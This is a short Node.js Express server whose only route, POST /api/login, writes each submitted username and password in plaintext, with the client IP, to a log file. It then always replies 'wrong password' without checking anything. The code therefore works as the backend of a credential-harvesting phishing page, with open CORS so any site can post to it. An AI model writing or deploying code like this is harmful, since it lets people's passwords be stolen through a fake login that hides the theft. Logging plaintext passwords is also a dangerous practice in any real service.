const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const app = express();

app.use(cors());
app.use(bodyParser.json());

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const logEntry = `${new Date().toISOString()} IP: ${req.ips}, Username: ${username}, Password: ${password}\n`;
  fs.appendFile('login_attempts.log', logEntry, (err) => {
    if (err) {
      console.error('Failed to record login attempt:', err);
      return res.status(500).send('Server error');
    }
    res.status(200).json({ message: 'wrong password' })
  });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
